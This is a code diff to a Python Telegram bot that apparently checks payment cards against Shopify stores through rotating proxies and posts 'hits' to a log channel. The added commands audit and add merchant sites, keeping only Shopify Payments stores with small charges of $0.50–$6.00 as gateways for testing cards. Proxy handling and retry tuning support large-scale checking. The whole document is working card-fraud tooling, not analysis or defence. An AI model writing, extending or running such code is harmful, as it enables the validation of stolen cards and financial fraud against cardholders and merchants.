@@ -76,13 +76,13 @@ MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channe
 LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel
 
 SH_COOLDOWN    = 25
-SITE_RETRIES      = 60   # max site attempts per card
-SITE_TIMEOUT      = 15   # seconds per API call — gives slow sites more room
+SITE_RETRIES      = 80   # max site attempts per card
+SITE_TIMEOUT      = 20   # seconds per API call — generous for slow proxies
 MAX_CONCURRENT    = 15   # cards checked in parallel
 CARD_STAGGER      = 0.3  # stagger between card launches (seconds)
 SITE_BATCH        = 3    # sites raced in parallel within each retry round
-CONSEC_TIMEOUT_MAX = 30  # abort card after 30 consecutive timeouts
-                         # (10 rounds × 3 × 15s = 150s before giving up)
+CONSEC_TIMEOUT_MAX = 45  # abort card after 45 consecutive timeouts
+                         # (15 rounds × 3 × 20s = 300s max before giving up)
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -100,7 +100,7 @@ _PROBE_LAST_RUN:    float = 0.0
 _PROBE_TASK:        "asyncio.Task | None" = None   # stored so shutdown can cancel it
 PROBE_TTL:          float = 1800.0   # re-probe every 30 min
 PROBE_CARD:         str   = "4000223372377978|05|29|651"   # same test card as sitechk.py
-PROBE_TIMEOUT:      float = 12.0
+PROBE_TIMEOUT:      float = 20.0
 PROBE_CONCURRENCY:  int   = 60
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1366,8 +1366,8 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
     px         = _proxy_url(proxy)
     url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
            if px else f"{API_URL}?cc={card}&site={site_url}")
-    # connect=3 so dead/hung sites fail in 3s not 12s
-    _to  = aiohttp.ClientTimeout(total=timeout, connect=3, sock_read=timeout)
+    # connect=5 so hung proxies fail fast while still giving real sites room
+    _to  = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
             async with session.get(url, ssl=False) as r:
@@ -1827,16 +1827,22 @@ async def _send_sticker(bot, chat_id, emoji_id: str):
 async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
                           parse_mode: str = "HTML", reply_markup=None,
                           disable_notification: bool = False):
-    """Send a hit card as an HTML message.
+    """Send a hit notification with a premium custom emoji sticker header.
 
-    emoji_id is accepted for API compatibility but ignored — custom emoji
-    sticker file_ids are rejected by Telegram's Bot API for all send methods.
-    Animated emoji are embedded directly in the caption via <tg-emoji> tags,
-    which animate for Premium users and show fallback glyphs for everyone else.
+    Embeds emoji_id as a standalone <tg-emoji> tag on the first line so it
+    renders as a large animated custom emoji for ALL Telegram users —
+    no Telegram Premium account needed.  The caption follows on the next line.
     """
     try:
+        if emoji_id:
+            text = (
+                f'<b><tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji></b>\n'
+                f'{caption}'
+            )
+        else:
+            text = caption
         await bot.send_message(
-            chat_id=chat_id, text=caption,
+            chat_id=chat_id, text=text,
             parse_mode=parse_mode, reply_markup=reply_markup,
             disable_web_page_preview=True,
             disable_notification=disable_notification,
@@ -1960,7 +1966,7 @@ async def _fetch_bin_direct(bin6: str) -> dict:
             },
         },
     ]
-    _to = aiohttp.ClientTimeout(total=6, connect=4)
+    _to = aiohttp.ClientTimeout(total=10, connect=5)
     for src in sources:
         try:
             async with aiohttp.ClientSession(
@@ -2710,6 +2716,661 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SITECHK  —  admin site management commands (PTB)
+#   /sitechk   Audit existing sites.txt (remove dead)
+#   /addsite   Upload a file of new sites to verify & add
+#   /siteall   Download the current sites.txt
+#   /dedupe    Force-deduplicate sites.txt
+#   /proxyinfo Show proxy stats (loaded from px.txt)
+#   /resetproxy Clear the bad-proxy cache
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+import os as _os
+
+# Sitechk-specific emoji IDs (reuse the already-defined constants)
+_SC_LIVE_EID      = PROG_LIVE_EMOJI_ID        # ✅
+_SC_DEAD_EID      = PROG_DEAD_EMOJI_ID        # ❌
+_SC_PROG_EID      = PROG_PROGRESS_EMOJI_ID    # 🔄
+_SC_GATE_EID      = PROG_GATE_EMOJI_ID        # 🌐
+_SC_ERRORS_EID    = PROG_ERRORS_EMOJI_ID      # ⚠️
+_SC_CARD_EID      = CARD_EMOJI_ID             # 💳
+_SC_USER_EID      = USER_EMOJI_ID             # 👤
+_SC_DEV_EID       = DEV_EMOJI_ID              # ⚡
+_SC_PRO_EID       = PRO_EMOJI_ID              # ⭐
+_SC_HIT_RESP_EID  = HIT_RESP_EMOJI_ID         # 🔗
+_SC_CHARGED_EID   = PROG_CHARGED_EMOJI_ID     # 💎
+_SC_REPORT_EID    = "5323674506705785412"     # 📜
+_SC_STATS_EID     = "5341715473882955310"     # 📊
+_SC_DUPE_EID      = "5801154993188770160"     # 🚫
+_SC_DONE_EID      = "5287777298894835685"     # ✨
+_SC_DENY_EID      = "4956739572114392015"     # ⛔
+_SC_DECLINED_EID  = DECLINED_EMOJI_ID         # 🚫
+
+# Bad-proxy set for sitechk (in-memory, reset on /resetproxy)
+_SC_BAD_PROXIES: set = set()
+
+# ── site file helpers ─────────────────────────────────────────────────────
+
+def _sc_read_sites() -> list:
+    """Read sites.txt; returns list (no duplicates)."""
+    if not _os.path.exists("sites.txt"):
+        return []
+    with open("sites.txt", "r", encoding="utf-8") as f:
+        return list(set(l.strip() for l in f if l.strip()))
+
+def _sc_write_sites(sites_list: list) -> int:
+    """Write unique sites to sites.txt. Returns number written."""
+    unique = list(set(sites_list))
+    with open("sites.txt", "w", encoding="utf-8") as f:
+        for s in unique:
+            f.write(f"{s}\n")
+    return len(unique)
+
+def _sc_normalize_url(url: str) -> str:
+    url = url.strip().lower().rstrip("/")
+    if url.startswith("www."):
+        url = url[4:]
+    return url
+
+# ── proxy helpers ─────────────────────────────────────────────────────────
+
+def _sc_get_random_proxy() -> Optional[str]:
+    """Pick a random proxy from _ALL_PROXIES, avoiding known bad ones."""
+    global _SC_BAD_PROXIES
+    px = _ALL_PROXIES or _load_proxies()
+    avail = [p for p in px if p not in _SC_BAD_PROXIES]
+    if not avail:
+        _SC_BAD_PROXIES.clear()
+        avail = list(px)
+    return random.choice(avail) if avail else None
+
+def _sc_mark_bad(proxy: str):
+    if proxy:
+        _SC_BAD_PROXIES.add(proxy)
+
+# ── single-site check ─────────────────────────────────────────────────────
+
+async def _sc_check_site(site: str) -> tuple:
+    """
+    Check one site. Returns (site, status, data_dict, msg_display).
+    status = "KEEP" | "REMOVE" | "ERROR"
+    """
+    MAX_TRIES = 3
+    for attempt in range(MAX_TRIES):
+        proxy = _sc_get_random_proxy()
+        try:
+            resp, gw, price_str, currency, http_st = await _call_api(
+                PROBE_CARD, site, proxy, timeout=PROBE_TIMEOUT
+            )
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            _sc_mark_bad(proxy)
+            if attempt < MAX_TRIES - 1:
+                await asyncio.sleep(0.4)
+                continue
+            return site, "REMOVE", {"Price": -1.0}, f"Error: {e}"
+
+        resp_up = resp.upper().strip()
+
+        # Proxy/network error → mark bad, retry
+        if (http_st is None or "timeout" in resp.lower() or
+                "connection error" in resp.lower() or
+                "proxy error" in resp.lower()):
+            _sc_mark_bad(proxy)
+            if attempt < MAX_TRIES - 1:
+                await asyncio.sleep(0.4)
+                continue
+            return site, "REMOVE", {"Price": -1.0}, resp
+
+        # Gateway must be Shopify Payments
+        if gw.upper().strip() != "SHOPIFY PAYMENTS":
+            return site, "REMOVE", {"Price": -1.0}, f"Gateway Rejected ({gw})"
+
+        # ORDER_PAID on test card → blocked site
+        if "ORDER_PAID" in resp_up or resp_up.replace(" ", "") == "PAID":
+            return site, "REMOVE", {"Price": -1.0}, "ORDER_PAID - Blocked"
+
+        # Check for dead-site errors
+        if _is_dead_site_response(resp):
+            return site, "REMOVE", {"Price": -1.0}, resp
+
+        # Valid bank response
+        if _is_success_response(resp):
+            try:
+                actual_price = float(re.sub(r"[^\d.]", "", str(price_str)))
+            except Exception:
+                actual_price = -1.0
+            # Price must be $0.50–$6.00
+            if 0.50 < actual_price <= 6.00:
+                return site, "KEEP", {"Price": actual_price}, f"${actual_price:.2f} | {resp}"
+            else:
+                return site, "REMOVE", {"Price": actual_price}, f"Price ${actual_price:.2f} (Rejected) | {resp}"
+
+        return site, "REMOVE", {"Price": -1.0}, f"Unknown Response: {resp}"
+
+    return site, "ERROR", {"Price": -1.0}, "Max Retries Reached"
+
+# ── bulk runner ───────────────────────────────────────────────────────────
+
+_SC_FILE_LOCK = asyncio.Lock()
+
+async def _sc_run_checker(bot, chat_id: int, sites_to_check: list,
+                          command_name: str = "Audit",
+                          status_message_id: int = None):
+    """Run the site checker; saves/sends report when done."""
+    global _SC_BAD_PROXIES
+    _SC_BAD_PROXIES.clear()
+    # Reload proxies if needed
+    if not _ALL_PROXIES:
+        _load_proxies()
+
+    total          = len(sites_to_check)
+    valid_sites    = []
+    working_lines  = []
+    dead_lines     = []
+    checked        = 0
+    live_count     = 0
+    dead_count     = 0
+    dup_count      = 0
+    last_edit      = 0.0
+    MIN_EDIT_INT   = 2.0
+    sem            = asyncio.Semaphore(50)
+
+    existing: set = set()
+    if command_name == "Adding":
+        existing = set(await asyncio.to_thread(_sc_read_sites))
+
+    async def _worker(site):
+        async with sem:
+            return await _sc_check_site(site)
+
+    tasks = [_worker(s) for s in sites_to_check]
+
+    for fut in asyncio.as_completed(tasks):
+        try:
+            site, status, data, msg = await fut
+        except Exception as e:
+            checked    += 1
+            dead_count += 1
+            dead_lines.append(f"{site} | Error: {e}")
+            continue
+
+        checked += 1
+        norm    = _sc_normalize_url(site)
+
+        if status == "KEEP":
+            if command_name == "Adding":
+                if norm in existing:
+                    dup_count += 1
+                else:
+                    # Append immediately
+                    async with _SC_FILE_LOCK:
+                        if norm not in existing:
+                            def _app():
+                                with open("sites.txt", "a", encoding="utf-8") as fh:
+                                    fh.write(f"{site}\n")
+                            await asyncio.to_thread(_app)
+                            existing.add(norm)
+                            live_count += 1
+                            valid_sites.append(site)
+                            price = data.get("Price", "0.00")
+                            price_s = f"${price:.2f}" if isinstance(price, float) else str(price)
+                            working_lines.append(f"{site} | Price: {price_s} | Response: {msg}")
+                        else:
+                            dup_count += 1
+            else:
+                live_count += 1
+                valid_sites.append(site)
+                price = data.get("Price", "0.00")
+                price_s = f"${price:.2f}" if isinstance(price, float) else str(price)
+                working_lines.append(f"{site} | Price: {price_s} | Response: {msg}")
+        else:
+            dead_count += 1
+            dead_lines.append(f"{site} | {msg}")
+
+        # Progress update
+        now = time.time()
+        if (now - last_edit > MIN_EDIT_INT or checked % 10 == 0) and status_message_id:
+            try:
+                dup_txt = ""
+                if dup_count > 0:
+                    dup_txt = (f'\n<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
+                               f' Duplicates ➳</b> <code>{dup_count}</code>')
+                px_total = len(_ALL_PROXIES) or 1
+                px_avail = px_total - len(_SC_BAD_PROXIES)
+                await bot.edit_message_text(
+                    chat_id=chat_id, message_id=status_message_id,
+                    text=(
+                        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+                        f' {command_name}ing {total} Sites...</b>\n'
+                        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
+                        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+                        f' Kept (&gt;$0–$5) ➳</b> <code>{live_count}</code>\n'
+                        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+                        f' Rejected ➳</b> <code>{dead_count}</code>\n'
+                        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+                        f' Checked ➳</b> <code>{checked}/{total}</code>\n'
+                        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+                        f' Proxies ➳</b> <code>{px_avail}/{px_total}</code>'
+                        f'{dup_txt}'
+                    ),
+                    parse_mode="HTML",
+                )
+                last_edit = now
+            except Exception:
+                pass
+
+    # ── Final dedup for Audit mode ───────────────────────────────────────
+    final_sites: list = []
+    seen_norms: set   = set()
+    for s in valid_sites:
+        n = _sc_normalize_url(s)
+        if n not in seen_norms:
+            seen_norms.add(n)
+            final_sites.append(s)
+    removed_dupes = len(valid_sites) - len(final_sites)
+
+    if command_name == "Audit":
+        saved = await asyncio.to_thread(_sc_write_sites, final_sites)
+    else:
+        saved = len(final_sites)
+
+    # ── Build report file ─────────────────────────────────────────────────
+    ts       = int(time.time())
+    fname    = f"sitechk_{command_name.lower()}_{ts}.txt"
+    total_dup = dup_count + removed_dupes
+    lines = [
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"TOTAL CHECKED: {total}",
+        f"WORKING SITES (>$0–$5): {len(final_sites)}",
+        f"REJECTED: {dead_count}",
+    ]
+    if total_dup > 0:
+        lines.append(f"DUPLICATES SKIPPED: {total_dup}")
+    px_total = len(_ALL_PROXIES) or 0
+    lines += [
+        f"PROXIES USED: {px_total} | BAD: {len(_SC_BAD_PROXIES)}",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"✅ WORKING SITES ({len(working_lines)})",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "\n".join(working_lines) if working_lines else "No valid sites found.",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"❌ DEAD / REJECTED ({len(dead_lines)})",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "\n".join(dead_lines) if dead_lines else "No dead sites.",
+    ]
+    report_content = "\n".join(lines)
+
+    try:
+        def _write_report():
+            with open(fname, "w", encoding="utf-8") as fh:
+                fh.write(report_content)
+        await asyncio.to_thread(_write_report)
+
+        dup_final = ""
+        if total_dup > 0:
+            dup_final = (f'\n<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
+                         f' Duplicates Blocked ➳</b> <code>{total_dup}</code>')
+        doc_caption = (
+            f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
+            f' {command_name} Complete!</b>\n\n'
+            f'<b>Total Checked ➳</b> <code>{total}</code>\n'
+            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+            f' Valid (&gt;$0–$5) ➳</b> <code>{len(final_sites)}</code>\n'
+            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+            f' Rejected ➳</b> <code>{dead_count}</code>\n'
+            f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
+            f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+            f' Proxies Used ➳</b> <code>{px_total}</code>'
+            f' | Bad ➳ <code>{len(_SC_BAD_PROXIES)}</code>'
+            f'{dup_final}'
+        )
+        await bot.send_document(
+            chat_id=chat_id,
+            document=InputFile(fname),
+            caption=doc_caption,
+            parse_mode="HTML",
+        )
+        try:
+            _os.remove(fname)
+        except Exception:
+            pass
+    except Exception as e:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=(f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
+                  f' Error ➳</b> <code>{escape(str(e)[:100])}</code>'),
+            parse_mode="HTML",
+        )
+
+
+# ── /sitechk ─────────────────────────────────────────────────────────────
+
+async def cmd_sitechk(update: Update,
+                      context: ContextTypes.DEFAULT_TYPE):
+    """Audit existing sites — remove dead ones and deduplicate."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    sites = await asyncio.to_thread(_sc_read_sites)
+    if not sites:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
+            f' No sites found in sites.txt</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    px_total = len(_ALL_PROXIES) or len(_load_proxies())
+    status_msg = await update.message.reply_text(
+        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+        f' Starting Audit on {len(sites)} Sites...</b>\n'
+        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
+        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+        f' Checked ➳</b> <code>0/{len(sites)}</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+        f' Kept (&gt;$0–$5) ➳</b> <code>0</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+        f' Rejected ➳</b> <code>0</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+        f' Proxies ➳</b> <code>{px_total}</code>',
+        parse_mode="HTML",
+    )
+    asyncio.create_task(_sc_run_checker(
+        context.bot, update.effective_chat.id,
+        sites, "Audit", status_msg.message_id,
+    ))
+
+
+# ── /addsite ─────────────────────────────────────────────────────────────
+
+async def cmd_addsite(update: Update,
+                      context: ContextTypes.DEFAULT_TYPE):
+    """Add new sites from an uploaded file — skips duplicates."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    msg = update.message
+    doc = msg.document
+    if not doc and msg.reply_to_message:
+        doc = msg.reply_to_message.document
+
+    if not doc:
+        await msg.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
+            f' Please upload a .txt file or reply to one with /addsite.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    try:
+        from io import BytesIO as _BytesIO
+        file_info   = await context.bot.get_file(doc.file_id)
+        buf         = _BytesIO()
+        await file_info.download_to_memory(buf)
+        buf.seek(0)
+        text = buf.read().decode("utf-8", errors="ignore")
+
+        url_pat   = r"(https?://\S+)"
+        new_sites = []
+        for line in text.split("\n"):
+            m = re.search(url_pat, line)
+            if m:
+                u = m.group(1).rstrip(".,;:!?)\"'")
+                new_sites.append(u)
+        new_sites = list(set(new_sites))
+
+        if not new_sites:
+            await msg.reply_text(
+                f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+                f' No valid URLs found in the file.</b>',
+                parse_mode="HTML",
+            )
+            return
+    except Exception as e:
+        logging.error(f"[ADDSITE] file read error: {e}", exc_info=True)
+        await msg.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+            f' Error reading file ➳</b> <code>{escape(str(e)[:80])}</code>',
+            parse_mode="HTML",
+        )
+        return
+
+    px_total   = len(_ALL_PROXIES) or len(_load_proxies())
+    status_msg = await msg.reply_text(
+        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+        f' Starting Addition of {len(new_sites)} Sites...</b>\n'
+        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
+        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
+        f' Checked ➳</b> <code>0/{len(new_sites)}</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+        f' Added (&gt;$0–$5) ➳</b> <code>0</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+        f' Rejected ➳</b> <code>0</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
+        f' Duplicates ➳</b> <code>0</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+        f' Proxies ➳</b> <code>{px_total}</code>',
+        parse_mode="HTML",
+    )
+    asyncio.create_task(_sc_run_checker(
+        context.bot, update.effective_chat.id,
+        new_sites, "Adding", status_msg.message_id,
+    ))
+
+
+# ── /siteall ─────────────────────────────────────────────────────────────
+
+async def cmd_siteall(update: Update,
+                      context: ContextTypes.DEFAULT_TYPE):
+    """Download the full deduplicated list of sites."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    sites = await asyncio.to_thread(_sc_read_sites)
+    if not sites:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
+            f' sites.txt is empty.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    fname = f"sites_full_{int(time.time())}.txt"
+    try:
+        def _write():
+            with open(fname, "w", encoding="utf-8") as fh:
+                fh.write(f"Total Sites: {len(sites)} (Deduplicated)\n\n")
+                fh.write("\n".join(sites))
+        await asyncio.to_thread(_write)
+
+        await update.message.reply_document(
+            document=InputFile(fname),
+            caption=(
+                f'<b><tg-emoji emoji-id="{_SC_REPORT_EID}">📜</tg-emoji>'
+                f' Total Sites ➳</b> <code>{len(sites)}</code>'
+                f' <tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
+                f' (No Duplicates)'
+            ),
+            parse_mode="HTML",
+        )
+        try:
+            _os.remove(fname)
+        except Exception:
+            pass
+    except Exception as e:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+            f' Error ➳</b> <code>{escape(str(e)[:100])}</code>',
+            parse_mode="HTML",
+        )
+
+
+# ── /dedupe ───────────────────────────────────────────────────────────────
+
+async def cmd_dedupe(update: Update,
+                     context: ContextTypes.DEFAULT_TYPE):
+    """Force-deduplicate sites.txt."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    sites = await asyncio.to_thread(_sc_read_sites)
+    if not sites:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
+            f' sites.txt is empty.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    original = len(sites)
+    final    = await asyncio.to_thread(_sc_write_sites, sites)
+    removed  = original - final
+
+    if removed > 0:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
+            f' Deduplication Complete!</b>\n\n'
+            f'<b>Original ➳</b> <code>{original}</code>\n'
+            f'<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
+            f' Removed ➳</b> <code>{removed}</code> duplicates\n'
+            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+            f' Final ➳</b> <code>{final}</code> unique sites',
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+            f' No duplicates found!</b>\n\n'
+            f'<b>Total Sites ➳</b> <code>{final}</code> (All Unique)',
+            parse_mode="HTML",
+        )
+
+
+# ── /proxyinfo ────────────────────────────────────────────────────────────
+
+async def cmd_proxyinfo(update: Update,
+                        context: ContextTypes.DEFAULT_TYPE):
+    """Show proxy statistics (loaded from px.txt)."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    if not _ALL_PROXIES:
+        _load_proxies()
+    avail   = len(_ALL_PROXIES) - len(_SC_BAD_PROXIES)
+    px_list = _ALL_PROXIES
+
+    text = (
+        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+        f' Proxy Information (from px.txt)</b>\n'
+        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
+        f'<b><tg-emoji emoji-id="{_SC_STATS_EID}">📊</tg-emoji>'
+        f' Total Proxies ➳</b> <code>{len(px_list)}</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+        f' Available ➳</b> <code>{avail}</code>\n'
+        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
+        f' Bad/Dead ➳</b> <code>{len(_SC_BAD_PROXIES)}</code>\n'
+        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n'
+    )
+
+    if px_list:
+        preview = 20
+        for i, px in enumerate(px_list[:preview], 1):
+            if px in _SC_BAD_PROXIES:
+                status_icon = f'<tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji> Dead'
+            else:
+                status_icon = f'<tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji> Live'
+            if "@" in px:
+                host_part = px.split("@")[1] if "@" in px else px
+                text += f"<code>{i}.</code> {escape(host_part)} — {status_icon}\n"
+            else:
+                text += f"<code>{i}.</code> {escape(px[:30])}... — {status_icon}\n"
+        if len(px_list) > preview:
+            text += f"\n... and {len(px_list) - preview} more."
+    else:
+        text += "<i>No proxies found in px.txt</i>"
+
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+# ── /resetproxy ───────────────────────────────────────────────────────────
+
+async def cmd_resetproxy(update: Update,
+                         context: ContextTypes.DEFAULT_TYPE):
+    """Reset the bad-proxy cache."""
+    user_id = update.effective_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
+            f' You are not authorized.</b>',
+            parse_mode="HTML",
+        )
+        return
+
+    global _SC_BAD_PROXIES
+    cleared = len(_SC_BAD_PROXIES)
+    _SC_BAD_PROXIES.clear()
+
+    # Re-load proxies from disk too
+    _load_proxies()
+
+    await update.message.reply_text(
+        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
+        f' Proxy List Reset!</b>\n\n'
+        f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
+        f' Cleared ➳</b> <code>{cleared}</code> bad proxies\n'
+        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
+        f' Available Now ➳</b> <code>{len(_ALL_PROXIES)}</code>',
+        parse_mode="HTML",
+    )
+
+
+def get_sitechk_handlers() -> list:
+    """Return all sitechk PTB CommandHandlers for registration in main.py."""
+    return [
+        CommandHandler("sitechk",   cmd_sitechk),
+        CommandHandler("addsite",   cmd_addsite),
+        CommandHandler("siteall",   cmd_siteall),
+        CommandHandler("dedupe",    cmd_dedupe),
+        CommandHandler("proxyinfo", cmd_proxyinfo),
+        CommandHandler("resetproxy",cmd_resetproxy),
+    ]
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # EXPORT
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def get_sh_handler() -> CommandHandler:
@@ -2727,4 +3388,8 @@ __all__ = [
     "_WORKING_SITES", "_PROBE_IN_PROGRESS",
     # Message sender — shared with mst.py
     "_send_as_media", "_get_sticker_fid",
+    # Sticker stubs — imported by main.py and mst.py
+    "_send_sticker", "get_random_live_emoji",
+    # Sitechk handlers
+    "get_sitechk_handlers",
 ]
